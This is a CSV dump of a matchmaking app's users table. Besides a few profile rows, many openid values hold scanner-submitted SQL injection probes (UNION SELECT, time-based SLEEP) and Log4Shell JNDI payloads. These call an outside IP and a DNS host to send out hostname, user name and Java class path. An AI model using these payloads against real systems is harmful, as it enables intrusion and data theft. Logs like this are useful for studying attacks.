id,openid,name,gender,expected_gender,contact,avatar_path,roles,created_at
94ba1757-3bd2-4a81-a4e6-3c7bb3586f2d,openid_alice,Alice,F,M,wx_alice,uploads/94ba1757-3bd2-4a81-a4e6-3c7bb3586f2d_alice.png,"matchee,matcher",2026-05-20T16:01:31+00:00
f3643ea7-7eb7-4783-83b8-b4a04300a950,openid_bob,Bob,M,F,wx_bob,uploads/f3643ea7-7eb7-4783-83b8-b4a04300a950_bob.png,"matchee,matcher",2026-05-20T16:09:14+00:00
35299efc-6187-4d3e-bc92-c6a325e64ef5,dev_test_e2e_001,,,,,,"matchee,matcher",2026-05-23T03:54:21+00:00
a2134c16-719d-4137-8958-4edbf64578c4,dev_logintest_001,,,,,,"matchee,matcher",2026-05-23T04:00:55+00:00
df90e7a8-ccea-4f59-b165-f5de0562b836,dev_4pzsyp04,,,,,,"matchee,matcher",2026-05-23T04:01:57+00:00
cf04ac83-b4e5-4e6d-abe4-46e459d768fd,dev_mznmx57o,黑猪,F,M,heizhu666,uploads/cf04ac83-b4e5-4e6d-abe4-46e459d768fd_e13f1892.jpg,"matchee,matcher",2026-05-23T04:04:07+00:00
b8b509f8-d6dd-4fe9-a1b0-ddd8738b3ce1,dev_adkauoxi,b 哥,M,M,bge,uploads/b8b509f8-d6dd-4fe9-a1b0-ddd8738b3ce1_f51316b7.jpg,"matchee,matcher",2026-05-23T04:07:49+00:00
213d3ac1-8f1f-40db-90bd-5414119534ff,94ba1757-3bd2-4a81-a4e6-3c7bb3586f2d,,,,,,"matchee,matcher",2026-05-23T04:20:35+00:00
612f7750-ec44-41ae-8890-031680b5699f,dev_blacklist_test,拉黑测试专家,M,ANY,,uploads/612f7750-ec44-41ae-8890-031680b5699f_black.png,"matchee,matcher",2026-05-23T04:39:50+00:00
f624781d-b519-4ac3-87ea-ae213f57d707,dev_rql6vwoj,,,,,,"matchee,matcher",2026-05-23T05:06:07+00:00
e0fbcd98-1710-407f-bf12-c55fc1704aa6,dev_etadojyd,,,,,,"matchee,matcher",2026-05-23T05:06:07+00:00
ed7f50a4-964c-446e-b4f9-4c03ca3f2ccd,dev_t5f5ynlg,,,,,,"matchee,matcher",2026-05-23T05:06:07+00:00
100dc1fb-fbe9-4143-b0e4-d5504486f2cd,dev_mjweueyo,,,,,,"matchee,matcher",2026-05-23T05:06:13+00:00
aece8875-0b19-4e1a-aacc-422f26eb51ea,dev_73kjt7tm,,,,,,"matchee,matcher",2026-05-23T05:06:22+00:00
260f0d0b-5a0a-4b9a-be4c-921a951456cc,dev_6zy8uf64,,,,,,"matchee,matcher",2026-05-23T05:06:22+00:00
4d63a609-a297-4ba4-9263-67cd36abeca9,dev_etadojyd' union select 1-- ,,,,,,"matchee,matcher",2026-05-23T05:07:30+00:00
7a95a5e3-3b65-4104-9b73-8188c8c4e521,"dev_etadojyd' union select 1,2-- ",,,,,,"matchee,matcher",2026-05-23T05:07:31+00:00
089decbf-9499-4d21-baf5-5583248762c9,"dev_etadojyd' union select md5(3141592657),2-- ",,,,,,"matchee,matcher",2026-05-23T05:07:31+00:00
86712f22-cff0-4321-b38c-133c0426da24,"dev_etadojyd' union select 1,md5(3141592657)-- ",,,,,,"matchee,matcher",2026-05-23T05:07:31+00:00
f54b252d-654c-4537-9b46-0450e54f5a85,dev_etadojyd')) OR (SELECT*FROM(SELECT(SLEEP(4)))lfvt) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:32+00:00
3e3e4c6b-2cea-4516-9f59-2809ec8e7a9e,')) OR (SELECT*FROM(SELECT(SLEEP(4)))bskv) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:32+00:00
957a79df-b639-43d9-ac2b-60f6f933841d,dev_etadojyd') OR (SELECT*FROM(SELECT(SLEEP(3)))mrtd) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:33+00:00
2f840640-fd9d-4445-a121-e5638a12dc94,"dev_etadojyd"" OR (SELECT*FROM(SELECT(SLEEP(4)))jqry) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:33+00:00
73093a75-d6fb-4b15-b958-2c4524da2232,') OR (SELECT*FROM(SELECT(SLEEP(3)))xpoc) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:34+00:00
1779e843-68c8-4b2d-8aab-1c625e1a87b0,"dev_etadojyd"")) AND (SELECT*FROM(SELECT(SLEEP(4)))ldkz) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:34+00:00
20309334-6e63-4423-8edc-b8ffe815eace,""")) AND (SELECT*FROM(SELECT(SLEEP(3)))elxj) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:35+00:00
fe8ab4c8-4555-4ece-871c-dcb2b72e13c2,""" AND (SELECT*FROM(SELECT(SLEEP(2)))zhbj) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:36+00:00
7149d993-6085-49de-b994-47ddf0fbac40,dev_etadojyd')) AND (SELECT*FROM(SELECT(SLEEP(2)))esls) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:36+00:00
6a87474f-5b95-4561-a328-cda230c08db5,"dev_etadojyd"") OR (SELECT*FROM(SELECT(SLEEP(3)))qnlt) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:37+00:00
bf6aa46a-ea6b-42c7-b602-a2b45817916a,dev_etadojyd' AND (SELECT*FROM(SELECT(SLEEP(2)))ndlo) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:37+00:00
5b525615-9e23-4931-8e8d-cc54e10ecbd7,' AND (SELECT*FROM(SELECT(SLEEP(3)))hbft) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:38+00:00
7e1eeb8e-82d8-467a-a1b3-f84e01eff046,dev_etadojyd') AND (SELECT*FROM(SELECT(SLEEP(3)))prux) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:38+00:00
c75b0ac4-5729-4ff9-878d-f22e8f4b1fe2,dev_etadojyd AND (SELECT*FROM(SELECT(SLEEP(3)))zzox) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:39+00:00
7599313a-3ffd-4159-a44e-ca77f26987e8,')) AND (SELECT*FROM(SELECT(SLEEP(4)))rntl) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:40+00:00
1117e256-7d94-4a3a-97a2-7b3ffabc9ed6,${jndi:ldap://183.47.120.213:1389/jdk184cdcefa5e0f0cc103563b8622ea3af35-/-${hostName}},,,,,,"matchee,matcher",2026-05-23T05:07:40+00:00
cd2a697d-d11b-48a8-b175-93367db79c8c,${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.3853ab6543359095298415b7c31148e5.4j2.mauu.mauu.me/},,,,,,"matchee,matcher",2026-05-23T05:07:41+00:00
49b534c0-1aff-47a7-9c52-29caf1add3f3,aaaa'%bf%27,,,,,,"matchee,matcher",2026-05-23T05:07:42+00:00
dc8bbaf4-7f10-4695-8a41-6736fa421499,${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.2a64e5f2dc52080f8ce91719b886b785.4j2.mauu.mauu.me/},,,,,,"matchee,matcher",2026-05-23T05:07:43+00:00
de651d93-02fe-4b09-9489-39755f02ae02,' OR (SELECT*FROM(SELECT(SLEEP(3)))tznj) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:43+00:00
7027c69d-3963-4e17-b677-61e58c7ec30f,') AND (SELECT*FROM(SELECT(SLEEP(4)))dvcj) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:44+00:00
fdb33d9e-8c95-46e5-8fca-d96e27ce3e13,${jndi:rmi://183.47.120.213:1099/bypass9120f02488d69915e228329122ecfc7f-/-${hostName}},,,,,,"matchee,matcher",2026-05-23T05:07:44+00:00
9229f59f-82b6-42c2-a0e8-9de67054aae4,"dev_etadojyd"") AND (SELECT*FROM(SELECT(SLEEP(4)))waoz) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:45+00:00
46393a53-3a41-4cc8-aeff-d6a185fc05c9,""")) OR (SELECT*FROM(SELECT(SLEEP(4)))rifj) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:46+00:00
071f9585-3a6e-4b9f-a36d-66f39df0ef40,dev_etadojyd' OR (SELECT*FROM(SELECT(SLEEP(4)))dyzd) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:46+00:00
8d887839-52be-4006-8b86-80b35a36b420,"dev_etadojyd"")) OR (SELECT*FROM(SELECT(SLEEP(3)))qnlt) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:47+00:00
467da7f6-dc70-4c08-b1fe-7557eb726601,' union select 1-- ,,,,,,"matchee,matcher",2026-05-23T05:07:47+00:00
e1a091c5-2ac1-40a3-afea-d746cc1ba711,"' union select 1,2-- ",,,,,,"matchee,matcher",2026-05-23T05:07:48+00:00
9d93101d-8af5-46d9-8811-f80724087e9f,"' union select md5(3141592657),2-- ",,,,,,"matchee,matcher",2026-05-23T05:07:49+00:00
95f48011-24e8-4877-8d96-55635aa877c4,"' union select 1,md5(3141592657)-- ",,,,,,"matchee,matcher",2026-05-23T05:07:50+00:00
0c15b78c-c3fd-43d7-8ac1-bc3a42c9c8cf,""") AND (SELECT*FROM(SELECT(SLEEP(4)))ubyx) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:50+00:00
a8c7b411-7848-4845-aa69-18172cb75a81, AND (SELECT*FROM(SELECT(SLEEP(3)))adhz) limit 1#,,,,,,"matchee,matcher",2026-05-23T05:07:52+00:00
53c34f86-d7ac-47ce-a29d-22fbe9ab40ef,""" OR (SELECT*FROM(SELECT(SLEEP(4)))avgq) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:52+00:00
db8ebc45-3071-4f97-a589-a9c5baa3306f,""") OR (SELECT*FROM(SELECT(SLEEP(3)))qnlt) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:53+00:00
548fc9cf-e861-40c4-9629-d2d76fde9948,"dev_etadojyd"" AND (SELECT*FROM(SELECT(SLEEP(3)))ieny) limit 1#",,,,,,"matchee,matcher",2026-05-23T05:07:54+00:00
8456aa12-0e46-4a3a-997e-9d65ee4bd059,"dev_etadojyd"" union select 1-- ",,,,,,"matchee,matcher",2026-05-23T05:07:55+00:00
038ef8a0-202b-4539-b74f-49c2724ef95c,"dev_etadojyd"" union select 1,2-- ",,,,,,"matchee,matcher",2026-05-23T05:07:56+00:00
af14568d-a583-4026-8fff-b7a5dbb9d108,"dev_etadojyd"" union select md5(3141592657),2-- ",,,,,,"matchee,matcher",2026-05-23T05:07:57+00:00
380ce44a-52e7-4579-9dc2-fe627e5792ea,"dev_etadojyd"" union select 1,md5(3141592657)-- ",,,,,,"matchee,matcher",2026-05-23T05:07:58+00:00
460d76b3-d98a-487e-81ac-427633d661ed,""" union select 1-- ",,,,,,"matchee,matcher",2026-05-23T05:07:58+00:00
aaa45f8c-291e-4490-90c7-989acd44637f,""" union select 1,2-- ",,,,,,"matchee,matcher",2026-05-23T05:07:59+00:00
5dd2a1f1-1411-44f9-a7e0-76e4a45374fe,""" union select md5(3141592657),2-- ",,,,,,"matchee,matcher",2026-05-23T05:07:59+00:00
4d596537-b988-4db8-bdd9-b11bfbb5e0a2,""" union select 1,md5(3141592657)-- ",,,,,,"matchee,matcher",2026-05-23T05:08:00+00:00
3257446f-117f-4b4c-b767-970f57b48c37,dev_zy3o486x,,,,,,"matchee,matcher",2026-05-23T12:04:38+00:00
785acf7a-6cc6-4a10-9e46-f1df279f05ab,dev_md8ntbxq,,,,,,"matchee,matcher",2026-05-23T12:04:38+00:00
a025a538-b965-4743-be77-ca7a48980c0c,dev_nepqcoro,,,,,,"matchee,matcher",2026-05-23T12:04:38+00:00
3db539a6-d1c4-48cf-a281-92e05e4e87d5,dev_z5azq1lv,,,,,,"matchee,matcher",2026-05-23T12:04:53+00:00
2e956643-1125-42d8-a33c-cc059948da9a,dev_j6ra1whj,,,,,,"matchee,matcher",2026-05-23T12:04:53+00:00
c3e22eb1-5942-49e1-a696-43d31758a4e2,dev_nepqcoro' union select 1-- ,,,,,,"matchee,matcher",2026-05-23T12:05:57+00:00
a9cb4b4d-cd76-4c7d-ba87-c85c5668b4f0,"dev_nepqcoro' union select 1,2-- ",,,,,,"matchee,matcher",2026-05-23T12:05:58+00:00
0caf3273-08f3-40ff-9dce-0636d4f21853,"dev_nepqcoro' union select md5(3141592657),2-- ",,,,,,"matchee,matcher",2026-05-23T12:06:00+00:00
e4e5543f-025a-4c5c-8043-338fab84095c,"dev_nepqcoro' union select 1,md5(3141592657)-- ",,,,,,"matchee,matcher",2026-05-23T12:06:00+00:00
4b3ba272-878f-4143-a02a-0db59d3da60c,${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.c37be17df99879e4f8e2fe24b21c5aa5.4j2.mauu.mauu.me/},,,,,,"matchee,matcher",2026-05-23T12:06:01+00:00
c060bce8-57a0-4f4a-9832-81d81c87a416,${jndi:ldap://183.47.120.213:1389/jdk189352b6f0b1a7193efb7284bf750711d4-/-${hostName}},,,,,,"matchee,matcher",2026-05-23T12:06:01+00:00
bcec9a63-bf94-41f5-8653-9777dae293fc,"dev_nepqcoro"" union select 1-- ",,,,,,"matchee,matcher",2026-05-23T12:06:06+00:00
6a2d8e1e-b3a2-46c8-8d2e-9720cde1aa87,"dev_nepqcoro"" union select 1,2-- ",,,,,,"matchee,matcher",2026-05-23T12:06:06+00:00
98059959-6af8-4ed0-afa0-68b9e4f3fd93,"dev_nepqcoro"" union select md5(3141592657),2-- ",,,,,,"matchee,matcher",2026-05-23T12:06:07+00:00
ec0cad4c-07bb-4aef-9549-c6aab6c262ed,"dev_nepqcoro"" union select 1,md5(3141592657)-- ",,,,,,"matchee,matcher",2026-05-23T12:06:08+00:00
a5152cd8-cb43-46e4-acd1-f39f9cb6beed,${jndi:rmi://183.47.120.213:1099/bypass6bec7298c6c321e2b76a9cd692afa6b3-/-${hostName}},,,,,,"matchee,matcher",2026-05-23T12:06:11+00:00
d12029b1-e5d8-4a7b-a98b-d761e2f41945,${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.12683a0535484768e2cc3726ad095740.4j2.mauu.mauu.me/},,,,,,"matchee,matcher",2026-05-23T12:06:12+00:00
7e3911ea-867a-46c8-9053-c78bf76893d9,test123,,,,,,"matchee,matcher",2026-05-23T17:13:19+00:00
8020e144-5640-4355-90a9-3df35d25f312,dev_zef7bzbs,23333D,M,M,明天下午成华大道,uploads/8020e144-5640-4355-90a9-3df35d25f312_9f0866e5.jpg,"matchee,matcher",2026-05-23T17:18:02+00:00
d0885ce1-107d-4198-8bbc-eb7c0d5bce18,dev_4cwh35gm,无赋,F,M,,,"matchee,matcher",2026-05-23T17:29:04+00:00
